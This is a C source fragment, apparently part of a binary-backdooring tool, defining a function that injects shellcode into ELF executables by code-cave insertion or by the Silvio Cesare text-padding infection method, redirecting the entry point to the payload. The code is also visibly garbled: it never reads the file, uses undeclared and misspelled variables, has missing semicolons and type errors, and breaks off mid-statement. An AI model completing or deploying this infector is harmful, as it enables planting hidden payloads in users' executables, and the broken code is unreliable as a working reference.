int binject_ELF(char *file,char *shellcode,int method)
{
  uint32_t size;
  int i,x;
  int sclen=strlen(shellcode);
  FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
 size=ftell(f);
  char *file_buffer = calloc(1,size);
  char *address=file_buffer;
  struct Elf32_Ehdr ehdr=(struct Elf32_Ehdr*)address;
  if(method==CODE_CAVE)
  {
	  address= file_buffer + ehdr->e_shoff;
  for(i=0;i<ehdr.shnum;i++)
  {       
	  struct Elf32_shdr shdr=(struct Elf32_Shdr*)address;
	  uint32_t section_start=Shdr->sh_offset;
	  uint32_t section_end=Shdr->sh_offset + shdr->sh_size;
       x=find_code_cave(sclen,section_start,section_end,file_buffer);
                        if(x!=0)
			{
                        memcpy(file_buffer+x,shellcodefixed,sclen+5)
			fwrite(file_buffer,1,size,f);
			free(shellcodefixed);
			free(file_buffer);
			fclose(f);
			return 0;
		        
			}
				section_start+=shdr->sh_size;
  }
                        if(x!=0)
                        return 1;
                        }
  if(method==SILVIO_METHOD)
  {
	  address=file_buffer +ehdr->e_phoff
	  for (i = 0; i < ehdr.e_phnum; i++) {
		  struct Elf32_phdr phdr= (struct Elf32_phdr*)address;
		if (offset) {
			phdr->p_offset += 4096;
		} else if (phdr->p_type == PT_LOAD && phdr->p_offset == 0) {
			
			ehdr.e_entry = p_vaddr+p_filesz;
			int palen;

			if (phdr->p_filesz != phdr->p_memsz) goto error;

			evaddr = phdr->p_vaddr + phdr->p_filesz;
			palen = PAGE_SIZE - (evaddr & (PAGE_SIZE - 1));

			if (palen < vlen)
			

			ehdr.e_entry = evaddr + ventry;
			offset = phdr->p_offset + phdr->p_filesz;

			phdr->p_filesz += vlen;
			phdr->p_filesz += 5;
			phdr->p_memsz += vlen;
			phdr->p_memsz += 5;
		}

		address+=phdr->filesz;
	}
	  if (offset == 0) 
		  return -1;
address=file_buffer+ehdr->e_shoff;
	for ( i = 0; i < ehdr.e_shnum; i++) {
		struct Elf32_Shdr shdr = (struct Elf32_Shdr*)address;
		if (shdr->sh_offset >= offset) {
			shdr->sh_offset += PAGE_SIZE;
		} else if (shdr->sh_addr + shdr->sh_size == evaddr) {
			if (shdr->sh_type != SHT_PROGBITS) goto error;

			shdr->sh_size += sclen;
			shdr->sh_size +=5;
		}

		address+=shdr->sh_size;
	}
	oshoff = ehdr.e_shoff;
	if (ehdr.e_shoff >= offset) ehdr.e_shoff += PAGE_SIZE;

 
memcpy(file_buffer+offset,shellcodefixe,sclen+5);
  fwrite(file_buffer,1,size,f);
  free(
}
           
 
}
